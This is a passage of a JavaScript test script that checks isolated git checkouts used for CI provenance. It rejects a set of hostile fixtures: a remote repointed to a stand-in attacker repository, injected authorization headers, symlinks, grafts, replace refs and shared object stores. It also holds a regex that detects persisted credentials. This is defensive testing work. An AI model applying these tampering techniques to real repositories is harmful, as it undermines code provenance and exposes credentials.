  assert.equal(gitAt(resolved, "rev-parse", `${expectedSha}^{tree}`), expectedTree, `${label}: wrong tree`);
  assert.equal(gitAt(resolved, "remote", "get-url", "origin"), OFFICIAL_REPOSITORY, `${label}: wrong repository`);
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "", `${label}: authority checkout modified`);
  const config = readFileSync(path.join(resolved, ".git/config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(config), `${label}: persisted credentials detected`);
  if (expectedBlob) {
    assert.equal(
      gitAt(resolved, "rev-parse", `${expectedSha}:.github/workflows/ci.yml`),
      expectedBlob,
      `${label}: required blob mismatch`,
    );
  }
  const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
  return {
    root: resolved,
    gitDir: realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue)),
  };
}

function verifyAncestryAuthority(suppliedRoot, chain = ANCESTRY_CHAIN, options = {}) {
  assert.ok(suppliedRoot, "ancestry: isolated authority root absent");
  assert.deepEqual(chain, ANCESTRY_CHAIN, "ancestry: exact chain mismatch");
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(), "ancestry: symlink authority forbidden");
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), "ancestry: primary candidate checkout forbidden");
  if (options.workspaceRoot && options.expectedRelative) {
    assert.equal(resolved, realpathSync(path.resolve(options.workspaceRoot, options.expectedRelative)),
      "ancestry: candidate-selected or escaping authority root");
  }
  assert.equal(gitAt(resolved, "remote", "get-url", "origin"), OFFICIAL_REPOSITORY, "ancestry: wrong repository");
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "", "ancestry: authority checkout modified");
  const config = readFileSync(path.join(resolved, ".git/config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(config), "ancestry: persisted credentials detected");
  const actual = gitAt(resolved, "rev-list", "--reverse", ORIGINAL_CANDIDATE).split("\n").filter(Boolean);
  assert.deepEqual(actual, ANCESTRY_CHAIN, "ancestry: incomplete or unrelated history");
  for (let index = 0; index < chain.length; index += 1) {
    const sha = chain[index];
    assert.match(sha, EXACT_SHA, "ancestry: exact lowercase SHA required");
    assert.equal(gitAt(resolved, "cat-file", "-t", sha), "commit", "ancestry: object is not commit");
    const tree = gitAt(resolved, "show", "-s", "--format=%T", sha);
    assert.match(tree, EXACT_SHA, "ancestry: tree identity malformed");
    assert.equal(gitAt(resolved, "cat-file", "-t", tree), "tree", "ancestry: tree absent");
    if (index > 0) {
      const parents = gitAt(resolved, "cat-file", "-p", sha).split("\n")
        .filter((line) => line.startsWith("parent ")).map((line) => line.slice(7));
      assert.deepEqual(parents, [chain[index - 1]], "ancestry: parent linkage mismatch");
    }
  }
  gitAt(resolved, "merge-base", "--is-ancestor", AUTHORIZED_BASE, ORIGINAL_CANDIDATE);
  const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
  return { root: resolved, gitDir: realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue)) };
}

const verifiedAuthorities = {
  original: verifyAuthorityRoot("original", authorityRoots.original, ORIGINAL_CANDIDATE, EXPECTED_TREES.original,
    undefined, workspaceOptions(".p1a-original-candidate")),
  baseline: verifyAuthorityRoot("baseline", authorityRoots.baseline, COMPOSED_CI_BASE, EXPECTED_TREES.baseline,
    EXPECTED_COMPOSED_CI_BLOB, workspaceOptions(".p1a-trusted-baseline")),
  dualBase: verifyAuthorityRoot("dual-base", authorityRoots.dualBase, TRUSTED_RECONCILIATION_BASE, EXPECTED_TREES.dualBase,
    EXPECTED_COMPOSED_CI_BLOB, workspaceOptions(".p1a-dual-base-authority")),
  evidenceBase: verifyAuthorityRoot("evidence-base", authorityRoots.evidenceBase, AUTHORIZED_BASE, EXPECTED_TREES.evidenceBase,
    "92d0002609c084a280a582b5e1ab39476032ca71", workspaceOptions(".p1a-evidence-base-authority")),
  ancestry: verifyAncestryAuthority(authorityRoots.ancestry, ANCESTRY_CHAIN,
    workspaceOptions(".p1a-ancestry-authority")),
  trustedReconciliation: (() => {
    assert.ok(authorityRoots.trustedReconciliation, "trusted reconciliation: isolated authority root absent");
    const resolved = realpathSync(path.resolve(authorityRoots.trustedReconciliation));
    if (process.env.GITHUB_WORKSPACE) {
      assert.equal(resolved, realpathSync(path.resolve(process.env.GITHUB_WORKSPACE,
        ".p1a-trusted-reconciliation-authority")),
      "trusted reconciliation: candidate-selected or escaping authority root");
    }
    verifyCanonicalTrustedReconciliationAncestry({ trustedReconciliationAuthorityRoot: resolved });
    const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
    return { root: resolved, gitDir: realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue)) };
  })(),
};
assert.equal(new Set(Object.values(verifiedAuthorities).map(({ gitDir }) => gitDir)).size, 6, "authority object stores overlap");
assert.ok(Object.values(verifiedAuthorities).every(({ gitDir }) => !gitDir.startsWith(path.join(root, ".git"))), "primary object store fallback forbidden");

const hostileFixtureRoot = path.join(temporary, "hostile-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, hostileFixtureRoot]);
gitAt(hostileFixtureRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const wrongRepositoryRoot = path.join(temporary, "wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, wrongRepositoryRoot]);
gitAt(wrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const credentialRoot = path.join(temporary, "credential-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, credentialRoot]);
gitAt(credentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(credentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const modifiedRoot = path.join(temporary, "modified-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.dualBase.root, modifiedRoot]);
gitAt(modifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(modifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const symlinkRoot = path.join(temporary, "symlink-authority");
symlinkSync(verifiedAuthorities.dualBase.root, symlinkRoot);
const evidenceFixtureRoot = path.join(temporary, "evidence-base-authority");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceFixtureRoot]);
gitAt(evidenceFixtureRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const evidenceWrongRepositoryRoot = path.join(temporary, "evidence-base-wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceWrongRepositoryRoot]);
gitAt(evidenceWrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const evidenceCredentialRoot = path.join(temporary, "evidence-base-credential");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceCredentialRoot]);
gitAt(evidenceCredentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(evidenceCredentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const evidenceModifiedRoot = path.join(temporary, "evidence-base-modified");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.evidenceBase.root, evidenceModifiedRoot]);
gitAt(evidenceModifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(evidenceModifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const evidenceSymlinkRoot = path.join(temporary, "evidence-base-symlink");
symlinkSync(verifiedAuthorities.evidenceBase.root, evidenceSymlinkRoot);
const ancestryWrongRepositoryRoot = path.join(temporary, "ancestry-wrong-repository");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryWrongRepositoryRoot]);
gitAt(ancestryWrongRepositoryRoot, "remote", "set-url", "origin", "https://github.com/attacker/zbestmedia");
const ancestryCredentialRoot = path.join(temporary, "ancestry-credential");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryCredentialRoot]);
gitAt(ancestryCredentialRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
gitAt(ancestryCredentialRoot, "config", "http.https://github.com/.extraheader", "AUTHORIZATION: redacted-test-marker");
const ancestryModifiedRoot = path.join(temporary, "ancestry-modified");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", verifiedAuthorities.ancestry.root, ancestryModifiedRoot]);
gitAt(ancestryModifiedRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
writeFileSync(path.join(ancestryModifiedRoot, "untracked-hostile.txt"), "hostile fixture\n");
const ancestrySymlinkRoot = path.join(temporary, "ancestry-symlink");
symlinkSync(verifiedAuthorities.ancestry.root, ancestrySymlinkRoot);
const ancestryIncompleteRoot = path.join(temporary, "ancestry-incomplete");
run(temporary, ["git", "clone", "-q", "--depth", "1", `file://${verifiedAuthorities.ancestry.root}`, ancestryIncompleteRoot]);
gitAt(ancestryIncompleteRoot, "remote", "set-url", "origin", OFFICIAL_REPOSITORY);
const verifyDualBase = (suppliedRoot, sha = TRUSTED_RECONCILIATION_BASE,
  tree = EXPECTED_TREES.dualBase, blob = EXPECTED_COMPOSED_CI_BLOB, options) =>
  verifyAuthorityRoot("dual-base-hostile", suppliedRoot, sha, tree, blob, options);
const verifyEvidenceBase = (suppliedRoot, sha = AUTHORIZED_BASE,
  tree = EXPECTED_TREES.evidenceBase, blob = "92d0002609c084a280a582b5e1ab39476032ca71", options) =>
  verifyAuthorityRoot("evidence-base-hostile", suppliedRoot, sha, tree, blob, options);
const verifyDistinctStores = (...items) => assert.equal(new Set(items.map(({ gitDir }) => gitDir)).size, items.length,
  "authority object stores overlap");
const verifyCleanup = (paths) => {
  for (const item of paths) assert.ok(!existsSync(item), `cleanup omitted or deletion failed: ${item}`);
};
const hostileAuthorityCases = [
  ["missing_isolated_trusted_repository", () => verifyDualBase(undefined)],
  ["wrong_repository", () => verifyDualBase(wrongRepositoryRoot)],
  ["wrong_trusted_sha", () => verifyDualBase(hostileFixtureRoot, "f".repeat(40))],
  ["mutable_branch_substituted", () => verifyDualBase(hostileFixtureRoot, "codex/bt-1")],
  ["mutable_tag_substituted", () => verifyDualBase(hostileFixtureRoot, "v1.0.0")],
  ["abbreviated_sha", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE.slice(0, 12))],
  ["malformed_sha", () => verifyDualBase(hostileFixtureRoot, "not-a-sha")],
  ["object_is_not_commit", () => verifyDualBase(hostileFixtureRoot, EXPECTED_COMPOSED_CI_BLOB)],
  ["required_tree_absent", () => verifyDualBase(hostileFixtureRoot, "0".repeat(40))],
  ["wrong_tree", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE, "f".repeat(40))],
  ["required_blob_mismatch", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE, EXPECTED_TREES.dualBase, "f".repeat(40))],
  ["candidate_repository_as_authority", () => verifyDualBase(root)],
  ["primary_shallow_fallback", () => verifyDualBase(root)],
  ["persisted_credentials", () => verifyDualBase(credentialRoot)],
  ["shared_object_store", () => verifyDistinctStores(verifiedAuthorities.dualBase, verifiedAuthorities.dualBase)],
  ["cleanup_omitted", () => verifyCleanup([hostileFixtureRoot])],
  ["cleanup_deletion_failure", () => verifyCleanup([modifiedRoot])],
  ["candidate_selected_trusted_root", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE,
    EXPECTED_TREES.dualBase, EXPECTED_COMPOSED_CI_BLOB,
    { workspaceRoot: temporary, expectedRelative: "expected-authority" })],
  ["environment_path_escape", () => verifyDualBase(hostileFixtureRoot, TRUSTED_RECONCILIATION_BASE,
    EXPECTED_TREES.dualBase, EXPECTED_COMPOSED_CI_BLOB,
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["trusted_checkout_modified", () => verifyDualBase(modifiedRoot)],
  ["symlink_authority", () => verifyDualBase(symlinkRoot)],
];
const evidenceBaseHostileCases = [
  ["missing_root", () => verifyEvidenceBase(undefined)],
  ["wrong_repository", () => verifyEvidenceBase(evidenceWrongRepositoryRoot)],
  ["wrong_sha", () => verifyEvidenceBase(evidenceFixtureRoot, "f".repeat(40))],
  ["mutable_branch", () => verifyEvidenceBase(evidenceFixtureRoot, "codex/bt-1")],
  ["mutable_tag", () => verifyEvidenceBase(evidenceFixtureRoot, "v1.0.0")],
  ["abbreviated_sha", () => verifyEvidenceBase(evidenceFixtureRoot, AUTHORIZED_BASE.slice(0, 12))],
  ["malformed_sha", () => verifyEvidenceBase(evidenceFixtureRoot, "not-a-sha")],
  ["object_not_commit", () => verifyEvidenceBase(evidenceFixtureRoot, "92d0002609c084a280a582b5e1ab39476032ca71")],
  ["missing_object", () => verifyEvidenceBase(evidenceFixtureRoot, "0".repeat(40))],
  ["wrong_tree", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE, "f".repeat(40))],
  ["wrong_blob", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "f".repeat(40))],
  ["candidate_root", () => verifyEvidenceBase(root)],
  ["primary_store", () => verifyEvidenceBase(root)],
  ["persisted_credentials", () => verifyEvidenceBase(evidenceCredentialRoot)],
  ["shared_store", () => verifyDistinctStores(verifiedAuthorities.evidenceBase, verifiedAuthorities.evidenceBase)],
  ["cleanup_omitted", () => verifyCleanup([verifiedAuthorities.evidenceBase.root])],
  ["candidate_selected_root", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "92d0002609c084a280a582b5e1ab39476032ca71",
    { workspaceRoot: temporary, expectedRelative: "wrong-root" })],
  ["environment_escape", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE,
    EXPECTED_TREES.evidenceBase, "92d0002609c084a280a582b5e1ab39476032ca71",
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["symlink_root", () => verifyEvidenceBase(evidenceSymlinkRoot)],
  ["wrong_authority_kind", () => verifyEvidenceBase(verifiedAuthorities.dualBase.root)],
  ["wrong_original_kind", () => verifyEvidenceBase(verifiedAuthorities.original.root)],
  ["modified_checkout", () => verifyEvidenceBase(evidenceModifiedRoot)],
  ["uppercase_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, AUTHORIZED_BASE.toUpperCase())],
  ["empty_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, "")],
  ["null_sha", () => verifyEvidenceBase(verifiedAuthorities.evidenceBase.root, null)],
];
const mutateChain = (index, value) => ANCESTRY_CHAIN.map((sha, offset) => offset === index ? value : sha);
const ancestryHostileCases = [
  ["missing_authority", () => verifyAncestryAuthority(undefined)],
  ["missing_intermediate", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN.filter((_, index) => index !== 4))],
  ["wrong_intermediate", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "f".repeat(40)))],
  ["wrong_parent_linkage", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(5, ANCESTRY_CHAIN[3]))],
  ["reversed_parent_linkage", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, [...ANCESTRY_CHAIN].reverse())],
  ["mutable_branch", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "codex/bt-1"))],
  ["mutable_tag", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "v1.0.0"))],
  ["abbreviated_sha", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, ANCESTRY_CHAIN[4].slice(0, 12)))],
  ["malformed_sha", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, "not-a-sha"))],
  ["wrong_repository", () => verifyAncestryAuthority(ancestryWrongRepositoryRoot)],
  ["tree_substituted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, EXPECTED_TREES.evidenceBase))],
  ["blob_substituted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, mutateChain(4, EXPECTED_COMPOSED_CI_BLOB))],
  ["candidate_checkout", () => verifyAncestryAuthority(root)],
  ["evidence_base_fallback", () => verifyAncestryAuthority(verifiedAuthorities.evidenceBase.root)],
  ["dual_base_fallback", () => verifyAncestryAuthority(verifiedAuthorities.dualBase.root)],
  ["trusted_baseline_fallback", () => verifyAncestryAuthority(verifiedAuthorities.baseline.root)],
  ["shared_object_store", () => verifyDistinctStores(verifiedAuthorities.ancestry, verifiedAuthorities.ancestry)],
  ["persisted_credentials", () => verifyAncestryAuthority(ancestryCredentialRoot)],
  ["candidate_selected_root", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN,
    { workspaceRoot: temporary, expectedRelative: "wrong-root" })],
  ["path_escape", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root, ANCESTRY_CHAIN,
    { workspaceRoot: path.join(temporary, "workspace"), expectedRelative: "authority" })],
  ["symlink_authority", () => verifyAncestryAuthority(ancestrySymlinkRoot)],
  ["incomplete_chain_with_endpoints", () => verifyAncestryAuthority(ancestryIncompleteRoot)],
  ["unrelated_commit_inserted", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root,
    [...ANCESTRY_CHAIN.slice(0, 4), TRUSTED_RECONCILIATION_BASE, ...ANCESTRY_CHAIN.slice(4)])],
  ["parent_relation_unverified", () => verifyAncestryAuthority(verifiedAuthorities.ancestry.root,
    ANCESTRY_CHAIN.map((sha, index) => index === 1 ? ANCESTRY_CHAIN[2] : sha))],
  ["primary_extra_history_dependency", () => verifyAncestryAuthority(root)],
];
let authorityHostilePassed = 0;
for (const [name, operation] of hostileAuthorityCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile authority accepted`);
  authorityHostilePassed += 1;
  console.log(`PASS isolated_authority_hostile:${name}`);
}
let evidenceBaseHostilePassed = 0;
for (const [name, operation] of evidenceBaseHostileCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile evidence-base authority accepted`);
  evidenceBaseHostilePassed += 1;
  console.log(`PASS evidence_base_authority_hostile:${name}`);
}
let ancestryHostilePassed = 0;
for (const [name, operation] of ancestryHostileCases) {
  let rejected = false;
  try { operation(); } catch { rejected = true; }
  assert.ok(rejected, `${name}: hostile ancestry authority accepted`);
  ancestryHostilePassed += 1;
  console.log(`PASS ancestry_authority_hostile:${name}`);
}

const shallowPrimary = path.join(temporary, "shallow-primary");
run(temporary, ["git", "clone", "-q", "--depth", "1", `file://${root}`, shallowPrimary]);
let shallowFailureReproduced = false;
try {
  run(shallowPrimary, ["git", "read-tree", TRUSTED_RECONCILIATION_BASE]);
} catch (error) {
  shallowFailureReproduced = /failed to unpack tree object/.test(error.stderr ?? "");
}
assert.ok(shallowFailureReproduced, "shallow primary checkout did not reproduce missing trusted tree");
console.log("PASS shallow_primary_missing_trusted_tree_reproduced");

const amendmentSourceSha = resolveAmendmentSource();
const trustedSourceRoot = path.join(temporary, "trusted-fixture-source");
run(temporary, ["git", "clone", "-q", "--no-hardlinks", "--no-checkout", trustedBaseWorkflowSource.root,
  trustedSourceRoot]);
gitAt(trustedSourceRoot, "remote", "set-url", "origin", `${OFFICIAL_REPOSITORY}.git`);
run(trustedSourceRoot, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", root,
  amendmentSourceSha]);
for (const source of [originalAmendmentWorkflowSource, rejectedChainWorkflowSource,
  predecessorWorkflowSource]) {
  run(trustedSourceRoot, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", source.root,
    source.exactSourceSha]);
}
gitAt(trustedSourceRoot, "checkout", "-q", "--detach", CURRENT_TRUSTED_BASE);
assert.equal(gitAt(trustedSourceRoot, "rev-parse", "HEAD"), CURRENT_TRUSTED_BASE,
  "provenance: isolated trusted source HEAD mismatch");
assert.equal(gitAt(trustedSourceRoot, "remote", "get-url", "origin"), `${OFFICIAL_REPOSITORY}.git`,
  "provenance: isolated trusted source repository mismatch");
assert.equal(gitAt(trustedSourceRoot, "status", "--porcelain=v1"), "",
  "provenance: isolated trusted source modified");
assert.equal(existsSync(path.join(trustedSourceRoot, ".git/objects/info/alternates")), false,
  "provenance: isolated trusted source uses alternates");
assert.equal(gitAt(trustedSourceRoot, "cat-file", "-t", CURRENT_TRUSTED_BASE), "commit",
  "provenance: exact trusted base absent");
assert.equal(gitAt(trustedSourceRoot, "cat-file", "-t", amendmentSourceSha), "commit",
  "provenance: exact amendment source absent");

run(temporary, ["git", "init", "-q", repository]);
const git = (...args) => run(repository, ["git", ...args]);
git("config", "user.email", "p1a-dual-base@example.invalid");
git("config", "user.name", "P1A dual-base fixture");
git("remote", "add", "origin", `${OFFICIAL_REPOSITORY}.git`);
for (const [name, sha] of [["original", ORIGINAL_CANDIDATE], ["baseline", COMPOSED_CI_BASE], ["dualBase", TRUSTED_RECONCILIATION_BASE], ["evidenceBase", AUTHORIZED_BASE]]) {
  run(repository, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", verifiedAuthorities[name].root, sha]);
  assert.equal(git("cat-file", "-t", sha), "commit", `${name}: fixture import failed`);
}
for (const sha of ANCESTRY_CHAIN) {
  run(repository, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", verifiedAuthorities.ancestry.root, sha]);
  assert.equal(git("cat-file", "-t", sha), "commit", `ancestry import failed: ${sha}`);
}
for (const sha of [CURRENT_TRUSTED_BASE, amendmentSourceSha]) {
  run(repository, ["git", "fetch", "--quiet", "--no-tags", "--no-write-fetch-head", trustedSourceRoot, sha]);
  assert.equal(git("cat-file", "-t", sha), "commit", `trusted fixture source import failed: ${sha}`);
}

const freshReconciliationFixture = (name, prepare) => {
  const fixture = path.join(temporary, `reconciliation-${name}`);
  run(temporary, ["git", "init", "-q", fixture]);
  prepare?.(fixture);
  return fixture;
};
const mutateDagForFixture = (index, replacement) => TRUSTED_RECONCILIATION_DAG.map(
  (entry, position) => position === index ? replacement(entry) : entry,
);
const reconciliationFixtureHostileControls = [
  ["missing_authority_root", () => propagateTrustedReconciliationDag({ reconciliationFixtureRoot: freshReconciliationFixture("missing-source") })],
  ["missing_destination_root", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root })],
  ["independent_verification_absent", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("unverified"), independentlyVerified: false })],
  ["missing_intermediate", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("missing-intermediate"), dag: TRUSTED_RECONCILIATION_DAG.filter((_, index) => index !== 6) })],
  ["wrong_intermediate", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("wrong-intermediate"), dag: mutateDagForFixture(6, (entry) => ({ ...entry, sha: "f".repeat(40) })) })],
  ["wrong_first_merge_topology", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("wrong-first-merge"), dag: mutateDagForFixture(6, (entry) => ({ ...entry, parents: [AUTHORIZED_BASE] })) })],
  ["wrong_second_merge_topology", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("wrong-second-merge"), dag: mutateDagForFixture(9, (entry) => ({ ...entry, parents: [...entry.parents].reverse() })) })],
  ["primary_checkout_source", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: root, reconciliationFixtureRoot: freshReconciliationFixture("primary-source") })],
  ["historical_authority_source", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.ancestry.root, reconciliationFixtureRoot: freshReconciliationFixture("historical-source") })],
  ["shared_source_destination", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: verifiedAuthorities.trustedReconciliation.root })],
  ["primary_checkout_destination", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: root })],
  ["symlink_destination", () => {
    const actual = freshReconciliationFixture("symlink-actual");
    const link = path.join(temporary, "reconciliation-symlink");
    symlinkSync(actual, link);
    propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: link });
  }],
  ["object_store_alternate", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("alternate", (fixture) => writeFileSync(path.join(fixture, ".git/objects/info/alternates"), `${verifiedAuthorities.trustedReconciliation.gitDir}/objects\n`)) })],
  ["replace_ref", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("replace", (fixture) => gitAt(fixture, "update-ref", `refs/replace/${AUTHORIZED_BASE}`, TRUSTED_RECONCILIATION_BASE)) })],
  ["graft_file", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("graft", (fixture) => writeFileSync(path.join(fixture, ".git/info/grafts"), `${AUTHORIZED_BASE} ${PRE_BASE_PARENT}\n`)) })],
  ["second_boundary_at_trusted_head", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("second-boundary", (fixture) => writeFileSync(path.join(fixture, ".git/shallow"), `${TRUSTED_RECONCILIATION_BASE}\n`)) })],
  ["multiple_boundaries", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("multiple-boundaries", (fixture) => writeFileSync(path.join(fixture, ".git/shallow"), `${AUTHORIZED_BASE}\n${TRUSTED_RECONCILIATION_BASE}\n`)) })],
  ["forbidden_preboundary_object", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("preboundary", (fixture) => run(fixture, ["git", "fetch", "-q", "--no-tags", "--no-write-fetch-head", verifiedAuthorities.evidenceBase.root, PRE_BASE_PARENT])) })],
  ["candidate_selected_dag", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("candidate-dag"), dag: [TRUSTED_RECONCILIATION_DAG.at(-1)] })],
  ["environment_selected_sha_list", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("environment-list"), dag: process.env.P1A_TRUSTED_SHA_LIST?.split(",") ?? [] })],
  ["staging_source_not_authority", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.dualBase.root, reconciliationFixtureRoot: freshReconciliationFixture("staging-source") })],
  ["raw_primary_history_fallback", () => assert.ok(readFileSync(path.join(root, "scripts/validate-p1a-threat-model.mjs"), "utf8").includes("fetch --unshallow"))],
  ["wholesale_object_copy", () => assert.ok(readFileSync(path.join(root, "scripts/validate-p1a-threat-model.mjs"), "utf8").includes("cp -R .git/objects"))],
  ["candidate_controls_authority_root", () => assert.ok(readFileSync(path.join(root, "scripts/validate-p1a-threat-model.mjs"), "utf8").includes("github.event.inputs.trusted_root"))],
  ["synthetic_ancestry_success", () => propagateTrustedReconciliationDag({ trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root, reconciliationFixtureRoot: freshReconciliationFixture("synthetic"), independentlyVerified: false })],
];
const reconciliationFixtureHostileOutcomes = reconciliationFixtureHostileControls.map(([name, operation]) => {
  const rejected = rejects(operation);
  if (rejected) console.log(`PASS reconciliation_fixture_hostile:${name}`);
  else console.error(`FAIL reconciliation_fixture_hostile:${name}: hostile condition accepted`);
  return rejected;
});

// Import only the independently verified in-scope commit objects into a disposable
// object store. The lower boundary is explicit; older business history is neither
// fetched nor treated as part of this proof.
run(temporary, ["git", "init", "-q", boundedRepository]);
const boundedGit = (...args) => gitAt(boundedRepository, ...args);
for (const sha of ANCESTRY_CHAIN) {
  const rawCommit = execFileSync("git", ["cat-file", "commit", sha], {
    cwd: verifiedAuthorities.ancestry.root, stdio: ["pipe", "pipe", "pipe"],
  });
  const importedSha = execFileSync("git", ["hash-object", "-w", "-t", "commit", "--stdin"], {
    cwd: boundedRepository, input: rawCommit, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
  }).trim();
